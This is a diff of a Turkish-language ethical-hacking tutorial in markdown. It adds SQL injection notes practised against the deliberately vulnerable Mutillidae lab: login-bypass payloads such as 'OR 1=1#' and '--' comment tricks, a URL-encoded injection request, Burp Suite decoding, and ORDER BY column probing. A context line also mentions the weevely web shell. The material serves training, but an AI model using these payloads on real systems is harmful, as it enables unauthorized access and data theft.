@@ -80,12 +80,12 @@
     - [SQL Şifre Girmeden Login Olma](#SQL-Şifre-Girmeden-Login-Olma)
     - [Daha Güvenli Sitelerde SQL Açığı](#Daha-Güvenli-Sitelerde-SQL-Açığı)
   - [SQL Get Methodu](#SQL-Get-Methodu)
-    - [SQL Union Select](#SQL-Union-Select)
-    - [SQL Sütun Sayısı Öğrenme](#SQL-Sütun-Sayısı-Öğrenme)
-    - [SQL Database Öğrenme](#SQL-Database-Öğrenme)
-    - [SQL Tablo İsimlerini Öğrenme](#SQL-Tablo-İsimlerini-Öğrenme)
-    - [SQL Sütun İsimlerini Öğrenme](#SQL-Sütun-İsimlerini-Öğrenme)
-    - [SQL Sütun İçindeki Bilgileri Öğrenme](#SQL-Sütun-İçindeki-Bilgileri-Öğrenme) 
+  - [SQL Union Select](#SQL-Union-Select)
+    - [SQL Union Select Sütun Sayısı Öğrenme](#SQL-Unio-Select-Sütun-Sayısı-Öğrenme)
+    - [SQL Union Select Database Öğrenme](#SQL-Union-Select-Database-Öğrenme)
+    - [SQL Union Select Tablo İsimlerini Öğrenme](#SQL-Union-Select-Tablo-İsimlerini-Öğrenme)
+    - [SQL Union Select Sütun İsimlerini Öğrenme](#SQL-Union-Select-Sütun-İsimlerini-Öğrenme)
+    - [SQL Union Select Sütun İçindeki Bilgileri Öğrenme](#SQL-Union-Select-Sütun-İçindeki-Bilgileri-Öğrenme) 
 
 # IP Çeşitleri
 > ## Public IP 
@@ -886,7 +886,7 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
   - | Kullanıcı Adı | jamess |
     | --- | --- |
     | Password | 123456' AND 1=1# |
-  - ```#``` Sonrasında yazılan kodu çalıştırmaz
+  - ```#``` Sonrasında yazılan kodu çalıştırmaz, bazı sitelerde ```#``` engellenmiş olabilir o durumlarda ```--```'da aynı işe yarar
 
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.07.20.jpeg)
 
@@ -900,6 +900,8 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
   | Password | abcd' OR 1=1# |
 
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.12.10.jpeg)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.32.14.jpeg)
 
 - Bu sefer kullanıcı adı üzerinden işlem yapıyoruz ve ```SELECT * FROM account WHERE username='jamess'# AND password='abvdsb'``` deniyoruz, yani;
 
@@ -920,12 +922,35 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.28.28.jpeg)
 
-![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.32.14.jpeg)
-
 #SQL Get Methodu
-> ## SQL Union Select
-> ## SQL Sütun Sayısı Öğrenme
-> ## SQL Database Öğrenme
-> ## SQL Tablo İsimlerini Öğrenme
-> ## SQL Sütun İsimlerini Öğrenme
-> ## SQL Sütun İçindeki Bilgileri Öğrenme
+
+- URL üzerinden değişiklik yaptığımız yöntemdir ancak yine giriş ekranıda kullanılabilir
+- Yollanılan parametreler URL üzerinden bize gösterilir
+
+- | Kullanıcı Adı | jamess'# |
+  | --- | --- |
+  | Password | 123 |
+
+- ```http://192.168.123.122/mutillidae/index.php?page=user-info.php&username=jamess%27%23&password=123&user-info-php-submit-button=View+Account+Details``` şekline URL'de görülür
+- ```Burpsuite decoder``` kısmında yazıları istediğimiz formatda görüntüleyebiliriz
+- ```Encode``` seçilen formata çevirir
+- ```Decode``` seçilen formattan geri çeviri
+- Bu yöntemle HTML, URL vb şeyleri kırabiliriz
+  - ```%27``` : "'"
+  - ```%23``` : "#"
+  - ```%20``` : (boşluk) 
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.56.47.jpeg)
+
+- SQL açığı test edilirken, giriş yapma sırasında ```ORDER BY```'da kullanılabiliyor
+
+- | Kullanıcı Adı | jamess'# |
+  | --- | --- |
+  | Password | 123dasdas' ORDER BY 1# |
+
+> ## SQL 
+> ## SQL Union Select Sütun Sayısı Öğrenme
+> ## SQL Union Select Database Öğrenme
+> ## SQL Union Select Tablo İsimlerini Öğrenme
+> ## SQL Union Select Sütun İsimlerini Öğrenme
+> ## SQL Union Select Sütun İçindeki Bilgileri Öğrenme
